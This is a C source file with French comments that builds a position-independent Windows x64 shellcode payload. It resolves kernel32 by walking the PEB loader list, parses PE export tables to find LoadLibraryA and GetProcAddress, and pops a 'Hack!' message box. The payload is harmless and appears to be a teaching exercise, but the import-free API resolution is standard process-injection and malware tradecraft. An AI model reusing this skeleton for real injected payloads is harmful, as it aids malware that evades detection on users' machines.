#include <windows.h>
#include <winternl.h>
#pragma section("inject", read, execute)

// === CONVERSION EN MINUSCULES (UNICODE) ===
static inline wchar_t wlow(wchar_t c)
{
    if (c >= L'A' && c <= L'Z')    // Si caractère majuscule Unicode
        return c - L'A' + L'a';    // Conversion en minuscule
    return c;                      // Sinon, retour inchangé
}

// === CONVERSION EN MINUSCULES (ASCII) ===
static inline wchar_t low(char c)
{
    if (c >= 'A' && c <= 'Z')      // Si caractère majuscule ASCII
        return c - 'A' + 'a';      // Conversion en minuscule
    return c;                      // Sinon, retour inchangé
}

// === COMPARAISON INSENSIBLE À LA CASSE (UNICODE) ===
__declspec(code_seg("inject"))    // Force le placement dans la section inject
wchar_t my_wcsicmp(wchar_t *s1, wchar_t *s2)
{
    for (int i = 0; s1[i]; i++)    // Parcours jusqu'au null terminator
    {
        wchar_t c1 = wlow(s1[i]);  // Conversion en minuscule
        wchar_t c2 = wlow(s2[i]);  // Conversion en minuscule
        if (c1 != c2)              // Si différence trouvée
            return c2;             // Retour de la différence
    }
    return 0;                      // Chaînes identiques
}

// === COMPARAISON INSENSIBLE À LA CASSE (ASCII) ===
__declspec(code_seg("inject"))
char my_stricmp(char *s1, char *s2)
{
    for (int i = 0; s1[i]; i += 1) // Parcours caractère par caractère
    {
        char c1 = low(s1[i]);      // Conversion en minuscule
        char c2 = low(s2[i]);      // Conversion en minuscule
        if (c1 != c2)              // Si différence trouvée
            return c1 - c2;        // Retour de la différence
    }
    return 0;                      // Chaînes identiques
}

__declspec(code_seg("inject"))
void *get_dll(wchar_t *name)
{
    // === ACCÈS AU TEB (Thread Environment Block) ===
    PTEB pTeb = NtCurrentTeb();           // TEB du thread courant
    PPEB pPeb = pTeb->ProcessEnvironmentBlock; // PEB du processus
    
    // === ACCÈS AU LOADER DATA ===
    PPEB_LDR_DATA pLdr = pPeb->Ldr;       // Structure de données du loader
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList; // Liste des modules
    
    // === PARCOURS DE LA LISTE DES MODULES CHARGÉS ===
    for (PLIST_ENTRY pNode = pList->Flink;  // Premier élément
         pNode != pList;                     // Tant qu'on n'a pas fait le tour
         pNode = pNode->Flink)               // Élément suivant
    {
        // Conversion de l'offset vers la structure complète
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pNode, 
            LDR_DATA_TABLE_ENTRY, 
            InMemoryOrderLinks
        );
        
        // === COMPARAISON DU NOM DE LA DLL ===
        if (!my_wcsicmp(pEntry->FullDllName.Buffer, name))
                return pEntry->DllBase;       // Retour de l'adresse de base
    }
    return 0;                               // DLL non trouvée
}

__declspec(code_seg("inject"))
PVOID get_func(void *dll, char *name)
{
    // === PARSING DE L'EN-TÊTE PE ===
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) dll;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)
        ((PUCHAR)dll + pDosHeader->e_lfanew);  // Accès à l'en-tête NT
    
    // === ACCÈS À LA TABLE D'EXPORT ===
    PIMAGE_DATA_DIRECTORY pDir = 
        &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)
        ((PUCHAR)dll + pDir->VirtualAddress);   // Adresse de la table d'export
    
    // === TABLEAUX DE LA TABLE D'EXPORT ===
    PDWORD rvaNames = (PDWORD)((PUCHAR)dll + pExport->AddressOfNames);
    PDWORD rvaPtrs = (PDWORD)((PUCHAR)dll + pExport->AddressOfFunctions);
    PWORD rvaOrd = (PWORD)((PUCHAR)dll + pExport->AddressOfNameOrdinals);
    
    // === ÉNUMÉRATION DES FONCTIONS EXPORTÉES ===
    for (int i = 0; i < pExport->NumberOfNames; i += 1)
    {
        // Récupération du nom de la fonction
        char *fname = (char*)((PUCHAR)dll + rvaNames[i]);
        WORD ord = rvaOrd[i];                   // Ordinal de la fonction
        PVOID ptr = (PVOID)((PUCHAR)dll + rvaPtrs[ord]); // Adresse de la fonction
        
        // === COMPARAISON AVEC LE NOM RECHERCHÉ ===
        if (!my_stricmp(name, fname))
            return ptr;                         // Fonction trouvée !
    }
    return 0;                                   // Fonction non trouvée
}
// === PROTOTYPES DES FONCTIONS WINDOWS ===
typedef HMODULE (*load_lib_t)(LPCSTR);    // LoadLibraryA
typedef FARPROC (*get_proc_t)(HMODULE, LPCSTR); // GetProcAddress
typedef int (*msg_box_t)(                 // MessageBoxA
    HWND,
    LPCSTR,
    LPCSTR,
    UINT
);


//__declspec(allocate("inject"))
//extern const wchar_t __kern32_str[]; // = L"C:\\windows\\system32\\kernel32.dll";

//__declspec(allocate("inject"))
extern const char __loadlib_str[]; // = "LoadLibraryA";


//__declspec(allocate("inject"))
extern const char __getproc_str[]; // = "GetProcAddress";

//__declspec(allocate("inject"))
extern const char __user32_str[]; // = "user32.dll";

//__declspec(allocate("inject"))
extern const char __msgbox_str[]; // = "MessageBox";

//__declspec(allocate("inject"))
extern const char __msgbox_title_str[]; // = "title";

__declspec(allocate("inject"))
extern const char __msgbox_content_str[]; // = "Hack!";


extern char __begin_of_code;
extern wchar_t __kern32_str[];

// extern "C"
__declspec(code_seg("inject"))
int main_inject(void *rbp)  // rbp = adresse de base du payload
{
    // === CALCUL DES OFFSETS RELATIFS ===
    // Toutes les chaînes sont à des offsets fixes depuis __begin_of_code
    LONGLONG delta_k32 = (PUCHAR)(&__kern32_str[0]) - (PUCHAR)&__begin_of_code;
    LONGLONG delta_load = (PUCHAR)(&__loadlib_str[0]) - (PUCHAR)&__begin_of_code;
    LONGLONG delta_getp = (PUCHAR)(&__getproc_str[0]) - (PUCHAR)&__begin_of_code;
    LONGLONG delta_user = (PUCHAR)(&__user32_str[0]) - (PUCHAR)&__begin_of_code;
    LONGLONG delta_msg_str = (PUCHAR)(&__msgbox_str[0]) - (PUCHAR)&__begin_of_code;
    LONGLONG delta_msg_title = (PUCHAR)(&__msgbox_title_str[0]) - (PUCHAR)&__begin_of_code;
    LONGLONG delta_msg_content = (PUCHAR)(&__msgbox_content_str[0]) - (PUCHAR)&__begin_of_code;

    // === RÉSOLUTION DE KERNEL32.DLL ===
    void *kern32 = get_dll((wchar_t *)((PUCHAR)rbp + delta_k32));
    // Recherche kernel32.dll dans le PEB
    
    // === RÉSOLUTION DES APIS DE BASE ===
    void *loadlib = get_func(kern32, (char *)((PUCHAR)rbp + delta_load));
    // Résolution de LoadLibraryA dans kernel32
    
    void *getproc = get_func(kern32, (char *)((PUCHAR)rbp + delta_getp));
    // Résolution de GetProcAddress dans kernel32

    // === CHARGEMENT DE USER32.DLL ===
    HMODULE user32 = ((load_lib_t)loadlib)((char *)((PUCHAR)rbp + delta_user));
    // Appel dynamique à LoadLibraryA("user32.dll")
    
    // === RÉSOLUTION DE MESSAGEBOXА ===
    void *msgbox = ((get_proc_t)getproc)(user32, (char *)((PUCHAR)rbp + delta_msg_str));
    // Appel dynamique à GetProcAddress(user32, "MessageBoxA")
    
    // === EXÉCUTION DU PAYLOAD ===
    ((msg_box_t)msgbox)(NULL,                                    // hWnd
        (char *)((PUCHAR)rbp + delta_msg_title),                // lpText
        (char *)((PUCHAR)rbp + delta_msg_content),              // lpCaption  
        0);                                                     // uType

    return 2600;  // Code de retour distinctif
}